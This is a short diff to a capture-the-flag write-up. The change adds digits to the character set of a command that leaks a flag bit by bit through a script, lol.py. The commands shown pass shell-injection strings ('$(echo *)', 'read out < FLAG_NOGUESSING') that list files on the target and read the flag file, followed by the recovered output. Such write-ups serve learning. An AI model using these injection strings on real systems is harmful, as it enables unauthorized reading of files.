@@ -39,7 +39,7 @@ Well, then!  We can exfiltrate the flag out, bit by bit.  The basic idea is this
 
 We wrote a [quick and dirty script to automate this][lol.py].  And, after many minutes of waiting, we had our flag:
 
-    $ python lol.py "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz ._-+" 'out="$(echo *)"'
+    $ python lol.py "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 ._-+" 'out="$(echo *)"'
     FLAG_NOGUESSING bin lib64 lost+found
     $ python lol.py "0123456789abcdef" "read out < FLAG_NOGUESSING"
     7c2b867e94f75bcb9a8e9cdf67e7a334
